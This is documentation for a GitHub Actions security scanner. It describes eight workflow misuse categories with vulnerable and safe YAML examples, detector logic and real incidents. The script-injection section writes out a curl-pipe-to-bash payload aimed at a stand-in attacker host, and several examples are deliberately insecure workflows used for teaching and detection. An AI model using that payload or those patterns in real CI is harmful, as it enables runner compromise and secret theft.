# Vulnerability taxonomy

Eight GitHub Actions misuse patterns, in the priority order
`scanner.detectors.DEFAULT_DETECTORS` runs them in. Each section covers
what the category is, the taint sources/sinks or structural conditions
the corresponding detector looks for, a vulnerable and a safe example, the
conditions under which a naive check would false-positive (and how the
detector avoids them), and a real incident or research result that shows
the category isn't theoretical.

Detector implementation lives in `scanner/detectors/<name>.py`; each
module's own docstring covers implementation-level nuance this document
doesn't repeat. Real instances of several of these categories, found by
running this scanner against ten popular public repositories, are
documented with exact file/line in
[`docs/REAL_WORLD_FINDINGS.md`](docs/REAL_WORLD_FINDINGS.md).

---

## 1. Script injection

**What it is.** GitHub Actions substitutes `${{ }}` expressions into a
`run:` step's script *before* handing it to the shell -- textually, as
string interpolation, not as a shell variable. If the expression contains
attacker-influenced free text (a PR title, an issue body, a comment, a
branch name someone chose), that text becomes part of the command line
the shell parses, and shell metacharacters in it (`` ` ``, `$(...)`, `;`,
`&&`, `|`, quotes) execute as shell syntax rather than being passed
through as data. This is the single most common way a forked pull request
gets arbitrary code execution out of a workflow that never intended to
grant it.

**Taint sources.** `scanner/taint.py`'s `TAINTED_CONTEXTS` allowlist:
free-text fields on events an untrusted actor can shape --
`github.event.issue.title`/`.body`, `github.event.pull_request.title`/`.body`,
`github.event.pull_request.head.ref`/`.label`, `github.event.comment.body`,
`github.event.review.body`, `github.event.discussion.title`/`.body`,
commit author name/email/message fields, and a few more (see the module
for the full list and the regex patterns covering array-indexed and
per-event "someone's email" fields the exact-match set can't express).
Deliberately an allowlist, not "anything under `github.event.*`" -- most
fields there (ids, booleans, SHAs, enums) are structurally safe, and a
blanket rule would drown real findings in noise.

**Sinks.** `run:` (executed by a shell) and `with.script` (executed as JS
by `actions/github-script` and equivalent actions using the same input
name) -- fields where a raw substitution becomes code, not merely a value
that gets read (`if:`, `name:`).

**Vulnerable:**

```yaml
on:
  issue_comment:
    types: [created]
jobs:
  respond:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Comment was ${{ github.event.comment.body }}"
```

A comment body of `` $(curl attacker.example/x|bash) `` runs on the
runner with whatever token/secrets that job has.

**Safe:**

```yaml
      - env:
          COMMENT_BODY: ${{ github.event.comment.body }}
        run: echo "Comment was $COMMENT_BODY"
```

Routing the tainted value through `env:` means it's substituted by the
shell as a plain variable, not by the Actions expression engine directly
into the command text -- it can no longer break out of quoting, because
by the time the shell sees it, it's already inside a variable, not part
of the script's own syntax.

**False-positive conditions.** A tainted context referenced in `if:` or
`name:` isn't a finding -- those fields are read, never executed as
shell/script. A tainted context already routed through `env:` and
referenced as `$VAR` in `run:` isn't a finding either: `Step.expressions()`
only reports `${{ }}` occurrences actually present in a field's raw text,
so an env-indirected value is invisible to the sink check by construction
-- exactly the property that makes GitHub's own recommended mitigation
verifiable by this detector. See `docs/REAL_WORLD_FINDINGS.md`'s react
deep-dive for a case where the rule fires correctly (tainted context, raw
in a `run:` sink) but the specific context value (`head.repo.full_name`)
turned out to be charset-restricted enough that it wasn't a working
exploit as written -- a real example of the gap between "matches the
pattern" and "is exploitable."

**Real-world reference.** GitHub's own security documentation names this
exact class: ["Understanding the risk of script
injections"](https://docs.github.com/en/actions/learn-github-actions/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)
and GitHub Security Lab's ["Keeping your GitHub Actions and workflows
secure: Untrusted
input"](https://securitylab.github.com/research/github-actions-untrusted-input/)
research, which catalogued this pattern across public repositories and is
the basis for GitHub's own hardening guidance. It's common enough that
`docs/REAL_WORLD_FINDINGS.md` found a live instance in facebook/react's
CI within a scan of only ten repositories.

---

## 2. `pull_request_target` misuse ("pwn requests")

**What it is.** `pull_request_target` runs with the *base* repository's
context: full `GITHUB_TOKEN` permissions and access to repository
secrets, even when triggered by a fork's pull request. That's safe by
itself -- the workflow *file* that runs is always the base branch's
version, never the fork's. It stops being safe the moment a step checks
out the fork's HEAD *content* (`actions/checkout` with `ref:` pointed at
`github.event.pull_request.head.sha` or similar) and something later in
the job builds, tests, or otherwise executes that content, because now
attacker-controlled code runs with the base repo's privileges.

**Structural condition (not a taint/sink pair).** `workflow.on` includes
`pull_request_target`, and some step's `uses: actions/checkout@...` sets
`with.ref` to an expression referencing the fork PR's head
(`github.event.pull_request.head.sha`/`.ref`/`.label`, or
`github.head_ref`) -- see `_FORK_HEAD_REF_CONTEXTS` in
`scanner/detectors/pull_request_target.py`. Deliberately a separate,
narrower allowlist from the script-injection taint sources: `head.sha`
isn't attacker-shapeable *text* that can break shell quoting, but it's
exactly the value that determines *which commit's content* gets checked
out, which is the property this detector cares about.

**Vulnerable:**

```yaml
on:
  pull_request_target:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm ci && npm test   # runs the fork's code, with base-repo secrets available
```

**Safe:**

```yaml
on:
  pull_request_target:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4   # no ref: override -- stays on the base branch
      - run: npm ci && npm test
```

Dropping the explicit `ref:` leaves checkout on the base branch, safe to
combine with the elevated token. If fork content genuinely needs
inspecting, do it in a separate job with no `secrets:` access and
`permissions: {}`, and never execute (build/test/run) what's checked out
there.

**False-positive conditions.** `pull_request_target` alone, with no
`ref:` override anywhere, isn't a finding -- it's the common, safe case
(label PRs, comment on them, etc., all using only the trigger's metadata).
A checkout that sets `ref:` to something *not* derived from the fork's
head (a fixed branch name, a tag) isn't a finding either -- see
`_checks_out_fork_head` requiring the `ref:` expression's context to
match the fork-head allowlist specifically, not just "any `ref:` is
present."

**Real-world reference.** GitHub Security Lab named and formally
documented this pattern a **"pwn request"** in their 2021 post
["Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn
requests"](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/) --
the term is now the standard name for this exact vulnerability class
across the security community. GitHub's own docs on [securely using
`pull_request_target`](https://docs.github.com/en/actions/reference/security/securely-using-pull_request_target)
exist specifically because of how often this misuse pattern recurs.

---

## 3. Excess `GITHUB_TOKEN` permissions

**What it is.** Every workflow run gets an auto-generated `GITHUB_TOKEN`.
Its scope is either what an explicit `permissions:` block grants, or --
if no block is present at any level -- the repository/organization's
default, which for repositories created before GitHub tightened the
default (February 2023) or with the org setting left broad can still mean
read/write across every scope. The risk isn't any specific grant; it's
that the *absence* of an explicit block makes the actual scope invisible
from the workflow file, and a compromised step (a malicious third-party
action, or a script-injection sink elsewhere in the same job) inherits
whatever that invisible default happens to be.

**Structural condition.** No `permissions:` block at the workflow level
*and* not every job sets its own (job-level permissions always override
workflow-level, explicit or not, so a workflow that omits the top-level
block but scopes every individual job isn't actually relying on the
broad default anywhere) → medium-severity finding. `permissions: write-all`
at either level → high-severity finding regardless of the above, since
that's an explicit, unambiguous overgrant rather than an invisible
default.

**Vulnerable:**

```yaml
on: [push, pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    # no permissions: anywhere -- GITHUB_TOKEN gets whatever this repo's/org's default is
    steps:
      - uses: actions/checkout@v4
      - run: ./build.sh
```

**Safe:**

```yaml
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: ./build.sh
```

Grant additional write scopes only on the specific jobs that need them,
not at the workflow level, so the blast radius of any one compromised
step is legible from the file itself.

**False-positive conditions.** A workflow with an explicit top-level
`permissions:` (even a narrow one, even an empty mapping meaning "no
scopes at all") isn't a finding for the implicit-default check, regardless
of whether individual jobs also set their own -- the top-level block
already removes the invisible-default risk for every job that doesn't
override it. A workflow where every single job sets its own `permissions:`
isn't a finding either, even with no top-level block, since nothing in
that file is actually relying on the org/repo default anywhere.

**Real-world reference.** GitHub changed the *default* for newly created
repositories to read-only `GITHUB_TOKEN` permissions in February 2023,
specifically in response to how often workflows were found running with
far broader tokens than they needed -- an implicit admission from GitHub
itself that the old broad default was a systemic risk, not a hypothetical
one. Repositories created before that change, or in organizations that
explicitly restored the broad default, remain exposed to exactly the
pattern this detector flags.

---

## 4. Secret/token leakage

**What it is.** Three related but distinct misuse patterns, all filed
under one category because they're all "the secrets store isn't being
used the way it's meant to be":

1. **Hardcoded credentials** -- a literal, recognizable credential shape
   (an AWS access key, a GitHub token, a PEM private key block, a plain
   `password: "..."` assignment) committed directly into the workflow
   YAML instead of referenced via `secrets.*`.
2. **Inline `secrets.*` interpolation in `run:`** -- GitHub masks
   *known* secret values in rendered logs by exact string match, but
   that's trivially defeated (partial prints, base64, char-by-char echo),
   and regardless of masking, the *literal secret value* is what the
   Actions runner substitutes into the generated script file for that
   step before execution -- exposed to step-debug logging, `set -x`, or
   any tracing wrapper, independent of whether the immediate command
   happens to print it. A command shaped like it prints its own output
   (`echo`/`cat`/`print`/`curl -v`/...) is escalated to critical.
3. **Secret embedded as URL basic-auth** (`https://user:${{ secrets.X }}@host/...`)
   -- tools that consume the URL (`curl`, `git`) commonly log or persist
   it in full (`.netrc`, `.git/config`, verbose output), a different
   exposure path than #2.

**Taint sources / sinks.** Not a `github.event.*` taint problem like
script injection -- the "source" here is the `secrets.*` context itself,
and the "sink" is any field that isn't the small set of
recommended-by-design channels (`env:` values, and `with:` inputs an
action explicitly documents as accepting a secret, e.g. `password:` on a
login action). `scanner/detectors/secrets.py` scans `run:`, `with:`, and
`env:` text for the three patterns above.

**Vulnerable:**

```yaml
      - run: |
          echo "Deploying with token ${{ secrets.DEPLOY_TOKEN }}"
          curl -H "Authorization: Bearer ${{ secrets.DEPLOY_TOKEN }}" https://deploy.example.com
```

**Safe:**

```yaml
      - env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
        run: |
          curl -H "Authorization: Bearer $DEPLOY_TOKEN" https://deploy.example.com
```

**False-positive conditions.** `${{ secrets.X }}` passed via a `with:`
input (`password: ${{ secrets.DOCKERHUB_TOKEN }}` to `docker/login-action`,
`token: ${{ secrets.GITHUB_TOKEN }}` to almost any first-party action) is
the *correct*, recommended way actions receive secret inputs -- not
flagged, since none of the three patterns above match a `with:` value
consumed as a structured input rather than interpolated into free text. A
regex-shaped "generic credential" match requires an actual quoted
16+-character value; a bare `${{ }}` expression with no literal value
never matches, so referencing a secret by name is never itself the
finding -- only a literal committed value is. See
`docs/REAL_WORLD_FINDINGS.md`'s apache/airflow deep-dive for the converse
nuance: the "echoed to log" escalation heuristic (an `echo`-shaped
command plus a `secrets.*` expression in the same `run:` block) doesn't
distinguish "printed to stdout" from "piped to another command's stdin,"
which is a real precision gap on the specific `echo $TOKEN | docker login
--password-stdin` pattern, even though the underlying "avoid inline
`${{ secrets.* }}` in `run:`" principle the rule enforces still holds for
the reason described above.

**Real-world reference.** The [Codecov Bash Uploader
compromise](https://about.codecov.io/security-update/) (undetected
2021-01-31 through 2021-04-01, affecting over 23,000 customers including
Twilio, HashiCorp, Rapid7, and Confluent): an attacker who'd extracted
credentials from a flawed Docker image build process modified the widely
`curl | bash`-invoked uploader script to exfiltrate every environment
variable from any CI run that used it -- AWS IAM keys, deploy keys, API
keys, tokens, whatever happened to be sitting in the CI environment. The
incident is the canonical illustration of *why* CI secrets are worth
protecting even when nothing in the workflow file itself looks obviously
broken: once a secret is in the CI environment, anything that runs there
(including a compromised third-party script) can reach it.

---

## 5. Unpinned third-party actions

**What it is.** `uses: org/action@<ref>` accepts a full commit SHA, a
tag, or a branch name -- but only a SHA is immutable. A mutable ref
(`@v4`, `@main`, `@latest`) can be repointed by the action's maintainer
(deliberately, via a compromised maintainer account, or via a compromised
publishing pipeline of theirs) to different content at any time, and the
next run of a workflow that only pinned the tag executes whatever that
tag now resolves to -- no change to the consuming workflow's own file
required, no review step to catch it.

**Structural condition.** `step.uses` has an `@<ref>` component that
isn't a bare hex string of 7-40 characters (`scanner/detectors/pinning.py`'s
`_SHA_REF_RE`) -- i.e., a tag, branch name, or any other non-SHA
identifier. Local actions (`./path`, no `@` at all) and Docker actions
addressed by tag/digest via `:` aren't in scope for this check.

**Vulnerable:**

```yaml
      - uses: actions/checkout@v4
      - uses: some-org/some-action@main
```

**Safe:**

```yaml
      - uses: actions/checkout@8f4b7f8c3c4c3a2f6a2a0e6e6d2f3b4c5d6e7f80 # v4
```

The trailing `# v4` comment keeps the human-readable version visible
without the workflow actually trusting that tag to stay put; tools like
Dependabot and Renovate can bump both the SHA and the comment together.

**False-positive conditions.** A ref that's already a hex string of 7+
characters is treated as pinned, matching how git itself treats
abbreviated SHAs as unambiguous references -- this project does not
require a full 40-character SHA specifically, since a short SHA is still
immutable in the sense that matters here (it can't be silently repointed
the way a tag can). Local composite actions and Docker-addressed actions
are excluded entirely rather than flagged as "no `@` ref found," since
neither uses GitHub's tag-mutability mechanism at all.

**Real-world reference.** [CVE-2025-30066](https://github.com/advisories/ghsa-mrrh-fwg8-r2c3):
in March 2025, attackers compromised the `tj-actions/changed-files`
maintainer's access and repointed **every version tag from `v1` through
`v45.0.7`** to a malicious commit that dumped CI runner memory --
including secrets -- directly into public workflow logs, across more than
23,000 repositories that had pinned the action by tag. A related
compromise of `reviewdog/action-setup@v1`
([CVE-2025-30154](https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction))
is believed to have been the initial foothold. Both are listed in CISA's
Known Exploited Vulnerabilities catalog. `docs/REAL_WORLD_FINDINGS.md`
found 230 tag-pinned actions across just two of the ten scanned repos
(django, react) -- each one a workflow that would have silently executed
malicious content the moment its pinned tag was repointed, exactly as
tj-actions/changed-files's consumers did.

---

## 6. Dependency confusion

**What it is.** A package manager resolving a name against multiple
configured indexes (a private/internal one and the public default) may
prefer whichever copy has the higher version number, regardless of which
index it came from. An attacker who publishes a malicious package under
an internal project's exact name to the *public* registry can have it
installed instead of (or racing) the real internal package, with no
authentication and no exploitation of any traditional vulnerability
required -- just knowledge of an internal package name, which is often
leaked incidentally (in public `package.json`/`requirements.txt` files,
error messages, or job postings).

**Structural condition, not taint/sink.** Static, heuristic pattern
matching on install commands in `run:` (`scanner/detectors/dependency_confusion.py`):

1. `pip install ... --extra-index-url <url>` -- pip's classic resolver
   compares versions across *every* configured index, including the
   public PyPI default, and installs the highest match found anywhere.
2. `npm install <name>` where the same step also configures a scoped
   private registry (`npm config set @scope:registry=...`) but installs
   an *unscoped* package name -- that unscoped name still resolves
   against the public npm registry, not the private one, since only the
   matching scope is routed there.

**Vulnerable:**

```yaml
      - run: pip install internal-widget-lib --extra-index-url https://pypi.internal.example.com/simple
```

**Safe:**

```yaml
      - run: pip install internal-widget-lib --index-url https://pypi.internal.example.com/simple
```

`--index-url` fully *replaces* the default index for that install rather
than adding to it, so pip has no public copy of the internal name to
accidentally prefer.

**False-positive conditions.** `pip install` without `--extra-index-url`
at all isn't a finding, regardless of how many packages are installed or
whether any of them look "internal" -- there's no cross-index ambiguity
to exploit without it. An `npm install` of a properly *scoped* package
name (`@myorg/internal-widget`) isn't a finding even alongside a scoped
registry config, since the scope routes it correctly; only an unscoped
name in the same command, alongside evidence a scoped registry is
configured, triggers the check.

**Real-world reference.** [Alex Birsan's February 2021
research](https://medium.com/@alex.birsan/dependency-confusion-how-i-hacked-into-apple-microsoft-and-dozens-of-other-companies-4a5d60fec610),
which coined the term: over an eight-month project, Birsan achieved code
execution on internal build/deployment systems at more than 35
organizations -- including Apple, Microsoft, PayPal, Shopify, Netflix,
Tesla, and Uber -- purely by publishing packages under internal names to
public registries, collecting over $130,000 in bug bounties (Microsoft
alone paid $40,000). No workflow file in that research needed to be
misconfigured in any way *except* the resolver-priority ambiguity this
detector's install-pattern check targets.

---

## 7. Cache poisoning

**What it is.** GitHub scopes Actions cache entries by branch, but
*restore* falls back across the branch hierarchy: a workflow run on the
base branch can restore a cache entry that was *written* by a workflow
run on a PR branch. For a `pull_request`-triggered workflow, that PR
branch is attacker-controlled -- a forked PR run can seed a cache entry
(a build artifact, a dependency resolved from a tampered lockfile, a
compiled output) that a later, privileged base-branch run then restores
and *trusts without rebuilding it*.

**Structural condition, two checks.** `scanner/detectors/cache_poisoning.py`,
only evaluated when `workflow.on` includes `pull_request`:

1. **`cache-poisoning`** -- any step that writes to the cache
   (`actions/cache`, `actions/cache/save`, or a `setup-*` action with its
   built-in `cache:` input enabled) inside that PR-triggered job.
2. **`predictable-cache-key`** -- a cache `key:`/`restore-keys:` derived
   directly from attacker-controlled context (via `scanner/taint.py`'s
   same tainted-context set), making a *specific* target entry easy to
   collide with deliberately rather than just opportunistically.

**Vulnerable:**

```yaml
on:
  pull_request:
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/cache@v4
        with:
          path: node_modules
          key: node-modules-${{ github.head_ref }}
      - run: npm ci && npm test
```

**Safe:**

```yaml
      - uses: actions/cache/restore@v4   # read-only in the fork-triggered job
        with:
          path: node_modules
          key: node-modules-${{ hashFiles('package-lock.json') }}
```

Switching to `actions/cache/restore` makes the fork-triggered job
read-only with respect to the cache; save from a base-branch (`push`)
workflow instead, and key on a content hash rather than a branch name so
even a base-branch write can't be steered toward a chosen slot.

**False-positive conditions.** No `pull_request` trigger at all means the
whole category doesn't apply -- a `push`-only or `workflow_dispatch`-only
workflow's cache writes aren't reachable from a fork PR in the first
place, regardless of what the cache action or key looks like. A cache
*read* (`actions/cache/restore`, or a `setup-*` action's cache input used
without ever writing back) isn't a write, so it isn't flagged.
`docs/REAL_WORLD_FINDINGS.md`'s django/django deep-dive documents the
inverse gap: a bare literal key (`key: Django`, no expression at all) is
*more* predictable than a tainted-expression key, yet the
`predictable-cache-key` sub-check specifically looks for a tainted `${{ }}`
expression and has nothing to inspect in a hardcoded literal -- a real,
now-tracked limitation of that specific sub-rule (the base
`cache-poisoning` write-in-PR-job check still catches the underlying
risk regardless).

**Real-world reference.** [Adnan Khan's GitHub Actions cache poisoning
research](https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/)
demonstrated this exact mechanism against Angular's CI in March 2024 --
a poisoned cache entry broke Angular's build for other contributors,
serving as a public, unintentional proof that the technique works against
a major, actively-maintained project. GitHub tightened cache-write
scoping in response in late 2024. `docs/REAL_WORLD_FINDINGS.md` found the
same write-in-PR-job pattern (though with content-hash keys, which
mitigates the *targeted* variant) across five of the ten repos scanned,
suggesting the underlying pattern remains common industry-wide even after
GitHub's mitigation.

---

## 8. Self-hosted runner misuse

**What it is.** Self-hosted runners are, by default, persistent,
non-ephemeral machines the repository owner controls -- unlike
GitHub-hosted runners, which are fresh VMs torn down after every job.
GitHub's own guidance is that self-hosted runners "should almost never be
used for public repositories," because any workflow a forked pull request
can trigger, if it runs on a self-hosted runner, hands that runner's
execution environment (and, if it's not properly isolated, anything left
behind by a prior job -- credentials, cached state, network access) to
whoever opened the PR.

**Structural condition, with a severity split by *what* the attacker
actually controls.** `scanner/detectors/runner.py`, only evaluated when
`workflow.on` includes `pull_request` and/or `pull_request_target`:

- **`pull_request` + `runs-on: self-hosted`** → **critical**. For this
  event, GitHub runs the workflow *file* as it exists in the merge of the
  PR branch -- which the fork author controls directly. `runs-on:` and
  every step are attacker-authored; this is full arbitrary code execution
  on the runner, no other misconfiguration required.
- **`pull_request_target` + `runs-on: self-hosted`** → **high**. The
  workflow file itself always comes from the base branch here (a fork
  can't rewrite `runs-on:` or the steps), but the job still runs with a
  privileged token on persistent infrastructure -- combined with the
  fork-checkout pattern in category #2, or simply by executing anything
  the job pulls in from the PR, this still reaches full compromise.

`runs-on:` is checked as a bare string, a list (`[self-hosted, linux, x64]`),
or the runner-group dict form (`{group: ..., labels: [...]}`, itself a
self-hosted-infrastructure-only feature).

**Vulnerable:**

```yaml
on:
  pull_request:
jobs:
  build:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test   # attacker's own workflow file, on your infrastructure
```

**Safe:**

```yaml
on:
  pull_request:
jobs:
  build:
    runs-on: ubuntu-latest   # fresh, ephemeral, torn down after the job
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test
```

If self-hosted infrastructure is genuinely required, restrict it to
non-fork-triggerable events (`push` to protected branches,
`workflow_dispatch`) and gate any exception behind explicit maintainer
approval, never a bare `pull_request`/`pull_request_target` trigger.

**False-positive conditions.** No `pull_request`/`pull_request_target`
trigger at all means the category doesn't apply regardless of the runner
-- `workflow_dispatch`-triggered production deploys on self-hosted
infrastructure, for instance, aren't reachable from a fork PR and aren't
flagged. This project's scanner has no way to know from the workflow file
alone whether a repository is actually public (where this is the real
attack surface) or private (where the risk is much lower), so it always
treats a fork-reachable trigger as risky -- see
`docs/REAL_WORLD_FINDINGS.md`'s microsoft/vscode deep-dive for a live
case where the flag is technically correct but the practical severity is
lower than the generic message implies, because the specific
"self-hosted" runner in question is a managed, ephemeral pool (Microsoft
1ES) rather than a raw persistent box -- a distinction this static
check has no way to see from `runs-on:` alone.

**Real-world reference.** [Adnan Khan and John Stawinski IV's 2023
research](https://www.legitsecurity.com/blog/github-pytorch-and-more-organizations-found-vulnerable-to-self-hosted-runner-attacks)
demonstrated exactly this attack chain against PyTorch's CI: a trivial,
approved documentation-fix PR was used to get a follow-up malicious PR
executed on PyTorch's self-hosted runners, from which they retrieved a
privileged `GITHUB_TOKEN` from a later, non-PR workflow sharing the same
persistent runner. The same class of vulnerability was subsequently found
at GitHub itself, TensorFlow, Microsoft DeepSpeed, and Chia Network,
across a research campaign that paid out over $250,000 in bug bounties.
`docs/REAL_WORLD_FINDINGS.md` found five jobs in microsoft/vscode's own
CI matching this exact pattern (`self-hosted` + bare `pull_request`, no
fork-repository guard) during this project's ten-repo scan --
Microsoft's use of managed, ephemeral 1ES pools is a real, meaningful
mitigation against the *specific* PyTorch-style attack chain, but the
underlying "don't run fork-triggered jobs on self-hosted infrastructure"
guidance this detector enforces is exactly what GitHub itself recommends
regardless.
